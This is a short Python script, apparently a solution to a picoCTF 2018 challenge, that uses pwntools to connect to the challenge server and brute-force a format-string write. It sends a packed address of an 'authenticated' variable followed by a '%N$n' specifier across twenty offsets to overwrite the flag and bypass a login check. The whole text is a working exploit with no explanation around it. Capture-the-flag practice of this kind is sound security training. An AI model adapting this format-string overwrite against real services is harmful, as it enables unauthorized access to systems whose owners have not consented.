from pwn import *

authenticated = 0x804a04c


for i in range(20):
	r = remote('2018shell3.picoctf.com', 27114)
	payload = p32(authenticated) + "%" + str(i) + "$n"
	r.sendline(payload)
	print (r.recvall())
	raw_input()
